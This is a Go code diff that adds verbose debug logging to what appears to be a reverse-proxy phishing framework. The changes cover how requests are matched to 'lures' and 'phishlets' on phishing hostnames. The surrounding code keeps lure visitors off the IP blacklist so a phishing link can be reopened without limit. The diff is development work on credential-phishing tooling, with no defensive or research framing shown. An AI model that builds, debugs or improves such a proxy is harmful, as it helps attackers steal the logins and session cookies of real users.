@@ -1179,13 +1179,17 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			// Skip blacklist for requests hitting a valid lure path so the URL can be reopened unlimited times
 			isLureHit := false
+			log.Debug("[REQUEST] Host='%s' Path='%s' checking for lure...", req.Host, req.URL.Path)
 			if lpl, ll := p.getLureForAnyPhishlet(req.Host, req.URL.Path); lpl != nil && ll != nil {
 				isLureHit = true
+				log.Debug("[REQUEST] lure HIT! phishlet='%s' path='%s'", lpl.Name, ll.Path)
 				// Remove from blacklist if previously added, so subsequent sub-requests also pass
 				if p.bl.IsBlacklisted(from_ip) {
 					p.bl.RemoveIP(from_ip)
 					log.Debug("blacklist: removed ip '%s' (lure path hit)", from_ip)
 				}
+			} else {
+				log.Debug("[REQUEST] lure NOT found for host='%s' path='%s'", req.Host, req.URL.Path)
 			}
 
 			if !isLureHit && p.cfg.GetBlacklistMode() != "off" {
@@ -5382,26 +5386,41 @@ func (p *HttpProxy) getPhishletByPhishHostAndPath(hostname string, path string) 
 // getLureForAnyPhishlet checks if the given path matches a lure for ANY enabled phishlet
 // on the given host. Returns the matching phishlet and lure, or nil if none found.
 func (p *HttpProxy) getLureForAnyPhishlet(hostname string, path string) (*Phishlet, *Lure) {
+	log.Debug("[getLureForAnyPhishlet] called with hostname='%s' path='%s'", hostname, path)
 	hostname = p.resolvePhishHost(hostname)
-	for _, l := range p.cfg.lures {
+	log.Debug("[getLureForAnyPhishlet] after resolve: hostname='%s'", hostname)
+	log.Debug("[getLureForAnyPhishlet] total lures: %d", len(p.cfg.lures))
+	for i, l := range p.cfg.lures {
+		log.Debug("[getLureForAnyPhishlet] lure[%d]: phishlet='%s' path='%s' enabled=%v", i, l.Phishlet, l.Path, p.cfg.IsSiteEnabled(l.Phishlet))
 		if l.Path == path && p.cfg.IsSiteEnabled(l.Phishlet) {
+			log.Debug("[getLureForAnyPhishlet] path matched! getting phishlet '%s'", l.Phishlet)
 			pl, err := p.cfg.GetPhishlet(l.Phishlet)
 			if err == nil {
 				// Check if this phishlet serves this host
 				phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+				log.Debug("[getLureForAnyPhishlet] GetSiteDomain('%s') = '%s', ok=%v", pl.Name, phishDomain, ok)
 				if ok {
-					for _, ph := range pl.proxyHosts {
-						if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					log.Debug("[getLureForAnyPhishlet] checking %d proxy hosts", len(pl.proxyHosts))
+					for j, ph := range pl.proxyHosts {
+						combined := combineHost(ph.phish_subdomain, phishDomain)
+						log.Debug("[getLureForAnyPhishlet] proxyHost[%d]: phish_sub='%s' combined='%s' vs hostname='%s' match=%v", 
+							j, ph.phish_subdomain, combined, hostname, hostname == combined)
+						if hostname == combined {
+							log.Debug("[getLureForAnyPhishlet] MATCH FOUND! returning pl and lure")
 							return pl, l
 						}
 					}
 				}
 				if l.Hostname == hostname {
+					log.Debug("[getLureForAnyPhishlet] matched by lure hostname")
 					return pl, l
 				}
+			} else {
+				log.Debug("[getLureForAnyPhishlet] GetPhishlet error: %v", err)
 			}
 		}
 	}
+	log.Debug("[getLureForAnyPhishlet] no match found, returning nil")
 	return nil, nil
 }
 
